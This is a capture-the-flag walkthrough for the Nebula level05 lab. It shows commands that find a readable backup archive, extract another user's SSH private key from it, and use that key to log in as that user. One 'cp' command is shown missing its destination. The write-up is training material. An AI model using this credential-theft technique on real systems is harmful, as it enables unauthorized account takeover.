# Challenge
Find and exploit the weak directory permissions.

Challenge Link: https://exploit.education/nebula/level-05/

# Solution
The challenge explicilty tells us to look for weak directory permissions so let's use `ls` to do just that.
```shell
level05@nebula:~$ ls -la /home/flag05/
total 5
drwxr-x--- 4 flag05 level05   93 2012-08-18 06:56 .
drwxr-xr-x 1 root   root     180 2012-08-27 07:18 ..
drwxr-xr-x 2 flag05 flag05    42 2011-11-20 20:13 .backup
-rw-r--r-- 1 flag05 flag05   220 2011-05-18 02:54 .bash_logout
-rw-r--r-- 1 flag05 flag05  3353 2011-05-18 02:54 .bashrc
-rw-r--r-- 1 flag05 flag05   675 2011-05-18 02:54 .profile
drwx------ 2 flag05 flag05    70 2011-11-20 20:13 .ssh
```

We don't have any permissions for `.ssh` so let's look at `.backup` which we do have permissions for.
```shell
level05@nebula:~$ ls /home/flag05/.backup/
backup-19072011.tgz 
```

Looks like we found an archive. Let's make a copy to our home directory and take a look inside.
```shell
level05@nebula:~$ cp /home/flag05/.backup/backup-19072011.tgz
level05@nebula:~$ ls
backup-19072011.tgz
level05@nebula:~$ file backup-19072011.tgz
backup-19072011.tgz: gzip compressed data, from Unix, last modified: Tue Jul 19 02:38:48 2011
level05@nebula:~$ gzip -d backup-19072011.tgz
level05@nebula:~$ ls
backup-19072011.tar
level05@nebula:~$ file backup-19072011.tar
backup-19072011.tar: POSIX tar archive (GNU)
level05@nebula:~$ tar -xvf backup-19072011.tar
.ssh/
.ssh/id_rsa.pub
.ssh/id_rsa
.ssh/authorized_keys
```

An SSH key! Let's see if we can log in as flag05 with it.
```shell
level05@nebula:~$ ssh -i ./.ssh/id_rsa flag05@localhost
flag05@nebula:~$ getflag
You have successfully executed getflag on a target account
```

Success! We have completed level05.
